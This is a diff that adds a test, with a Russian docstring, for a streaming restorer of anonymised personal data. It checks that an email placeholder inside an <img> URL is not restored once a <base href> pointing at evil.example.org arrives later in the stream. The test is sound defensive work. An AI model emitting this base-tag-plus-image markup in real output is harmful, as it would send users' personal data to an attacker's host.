@@ -1663,6 +1663,14 @@ def test_base_tag_and_srcdoc_keep_labels(settings, answer):
     assert "ivanov@contoso.ru" not in result.text and "foreign_link" in kinds(result)
 
 
+def test_stream_checks_links_again_when_a_base_tag_arrives_later(settings):
+    """Поток собирает восстановление один раз на ответ (FINDINGS P3 «На каждый кусок потока, продвигающий границу
+    показа…»), а <base> ищется в каждом показанном префиксе заново."""
+    restorer = StreamRestorer(link_state(), settings)
+    assert "ivanov@contoso.ru" in restorer.feed('<img src="p?q=<EMAIL_1>"> ')
+    assert "ivanov@contoso.ru" not in restorer.feed('<base href="https://evil.example.org/"> ')
+
+
 def test_relative_link_without_a_base_tag_still_restores(settings):
     assert "ivanov@contoso.ru" in restore(link_state(), '<img src="p?q=<EMAIL_1>"> база данных <basement>', settings).text
 
